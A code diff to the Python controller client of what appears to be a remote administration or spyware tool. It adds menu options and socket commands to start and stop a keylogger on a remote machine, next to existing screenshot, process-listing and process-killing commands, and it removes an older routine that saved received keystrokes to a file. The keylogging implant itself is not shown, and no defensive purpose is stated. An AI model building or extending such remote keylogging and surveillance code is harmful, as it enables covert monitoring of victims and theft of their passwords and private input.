@@ -8,6 +8,8 @@ CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_KEY_LOGGER = 'keylogger'
 CMD_VIEW_PROCESSES = 'view_processes'
 CMD_KILL_PROCESS = 'kill_process'
+CMD_START_KEYLOGGER = 'start_keylogger'
+CMD_STOP_KEYLOGGER = 'stop_keylogger'
 
 # BUFFER
 BUFFER_SIZE = 1024
@@ -49,7 +51,9 @@ class Client:
       1: Take screenshot
       2: View processes
       3: Kill process
-      4: Shutdown''')
+      4: Start key logger
+      5: Stop key logger
+      6: Shutdown''')
       cmd = input('Enter command: ')
       if cmd == '1':
         self.take_screenshot()
@@ -60,6 +64,10 @@ class Client:
         pid = input('Enter PID: ')
         self.kill_process(pid)
       elif cmd == '4':
+        self.start_keylogger()
+      elif cmd == '5':
+        self.stop_keylogger()
+      elif cmd == '6':
         self.shutdown()
         break
 
@@ -79,13 +87,11 @@ class Client:
         else:
           f.write(data)
 
-  def key_logger(self):
-    with open(os.path.join(SCREENSHOT_PATH, 'keylog.txt'), 'w') as f:
-      while True:
-        data = self.socket.recv(BUFFER_SIZE)
-        if not data:
-          break
-        f.write(data)
+  def start_keylogger(self):
+    self.socket.send(CMD_START_KEYLOGGER.encode())
+
+  def stop_keylogger(self):
+    self.socket.send(CMD_STOP_KEYLOGGER.encode())
 
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
